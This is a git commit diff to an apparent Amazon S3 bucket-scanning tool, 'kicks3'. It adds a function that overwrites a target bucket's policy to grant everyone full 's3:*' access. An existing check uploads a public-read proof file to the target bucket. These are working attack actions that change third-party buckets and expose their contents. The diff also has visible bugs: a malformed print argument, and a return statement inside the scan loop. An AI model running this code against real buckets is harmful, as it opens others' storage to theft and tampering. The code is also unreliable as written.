584d57a1258e64cf6ab967cd9ee82044a4bc83b6
Syed <20999104+abuvanth@users.noreply.github.com>
2020-02-06 14:36:50 +0530

    add put bucket policy testcase

--- kicks3/kicks3.py
+++ kicks3/kicks3.py
@@ -4,6 +4,7 @@ import requests,re,argparse,urllib
 import os 
 import json
 import boto3
+import botocore
 import colorama
 import kickdomain
 from colorama import init, Fore, Back, Style
@@ -16,21 +17,21 @@ def islist(obj):
     else: 
       return False
 def check_listings (bucket):
-        unauth=False
-        auth=False
-        s3=boto3.client('s3')
-	try:
-		session = requests.Session()
-		headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"}
-		response = session.get("http://"+bucket+".s3.amazonaws.com", headers=headers)
-		if "<ListBucketResult xmlns" in response.content:
-			unauth=True
-                if s3.list_objects(Bucket=bucket):
-                   auth=True
-	except Exception,e:
-		#print str(e)
-		return (unauth,auth)
-        return (unauth, auth)
+    unauth=False
+    auth=False
+    s3=boto3.client('s3')
+    try:
+       session = requests.Session()
+       headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"}
+       response = session.get("http://"+bucket+".s3.amazonaws.com", headers=headers)
+       if "<ListBucketResult xmlns" in str(response.content):
+          unauth=True
+       if s3.list_objects(Bucket=bucket):
+          auth=True
+    except Exception as e:
+          #print(str(e))
+          pass
+    return (unauth,auth)
 
 def get_bucket_acl(bucket):
     try:    
@@ -40,7 +41,16 @@ def get_bucket_acl(bucket):
     except: 
        return False
     
-    
+def put_bucket_policy(bucket):
+    try:
+       bucket_name = bucket
+       bucket_policy = {'Version': '2012-10-17','Statement': [{'Sid': 'AddPerm','Effect': 'Allow','Principal': '*','Action': 's3:*','Resource': 'arn:aws:s3:::'+bucket_name+'/*'}]}
+       bucket_policy = json.dumps(bucket_policy)
+       s3 = boto3.client('s3')
+       s3.put_bucket_policy(Bucket=bucket_name, Policy=bucket_policy)
+       return True
+    except:
+       return False
 
 def get_bucket_name(urllist):
   b_list=[]
@@ -54,30 +64,31 @@ def get_bucket_name(urllist):
   return remove_duplicate(b_list)
 
 
-def check_upload (bucket):
-        content="test file from kick-s3 tool"
-	try:		   
-            s3=boto3.resource('s3')
-            s3.Object(bucket, 'poc.txt').put(Body=content)
-            s3.ObjectAcl(bucket,'poc.txt').put(ACL='public-read')
-	    return True
-	except Exception,e:		
-               return False
+def check_upload(bucket):
+    content="test file from kick-s3 tool" 
+    try:		   
+       s3=boto3.resource('s3')
+       s3.Object(bucket, 'poc.txt').put(Body=content)
+       s3.ObjectAcl(bucket,'poc.txt').put(ACL='public-read')
+       return True
+    except Exception as e:		
+           return False
 def scan_s3(f,silent=False):
-        result=[]
-        if not islist(f):
-           f=[f]
-	for line in f:
-            line=line.strip('\n')
-            s3out=open('s3out.txt','a')
-            listing=check_listings (line)
-            upload=check_upload(line)
-            get_acl=get_bucket_acl(line)
-            if not silent:
-               print('Bucketname - '+line,'unauth_list - '+str(listing[0]),'auth_list - '+str(listing[1]),'auth_write - '+str(upload),'get-bucket-acl'+str(get_acl))
-            s3out.write('Bucketname - '+line+','+'unauth_list - '+str(listing[0])+','+'auth_list - '+str(listing[1])+','+'auth_write - '+str(upload)+','+'get-bucket-acl'+str(get_acl)+'\n')
-            s3out.close()
-            result=result+[(line,listing[0],listing[1],upload,get_acl)]
+    result=[]
+    if not islist(f):
+       f=[f]
+    for line in f:
+        line=line.strip('\n')
+        listing=check_listings (line)
+        upload=check_upload(line)
+        get_acl=get_bucket_acl(line)
+        put_acl=put_bucket_policy(line)
+        if not silent:
+           s3out = open('s3out.txt', 'a')
+           print('Bucketname - '+line,'unauth_list - '+str(listing[0]),'auth_list - '+str(listing[1]),'auth_write - '+str(upload),'get-bucket-acl'+str(get_acl),+str(put_acl))
+           s3out.write('Bucketname - '+line+','+'unauth_list - '+str(listing[0])+','+'auth_list - '+str(listing[1])+','+'auth_write - '+str(upload)+','+'get-bucket-acl - '+str(get_acl)+',put_bucket_policy - '+str(put_acl)+'\n')
+           s3out.close()
+        result=result+[(line,listing[0],listing[1],upload,get_acl,put_acl)]
         return result	       
 
 def finds3(sitelist,cookies='',sub=0):
@@ -174,10 +185,12 @@ if __name__=='__main__':
        if i[2]:
           print (Fore.GREEN +"[*] S3 Bucket Lists Files for all aws authenticated users [*]")
        else:
-    	  print (Fore.RED +"[*] Directory Listings ... Access Denied [*]")
+          print (Fore.RED +"[*] Directory Listings ... Access Denied [*]")
        if i[3]:
           print (Fore.GREEN +"[*] File uploaded Successfully [*]")
        else:
           print (Fore.RED +"[*] File  Not Upload ... Access Denied [*]")
        if i[4]:
           print(Fore.GREEN +"[*] Get acl read")
+       if i[5]:
+          print(Fore.GREEN+"[*] Put bucket_policy")
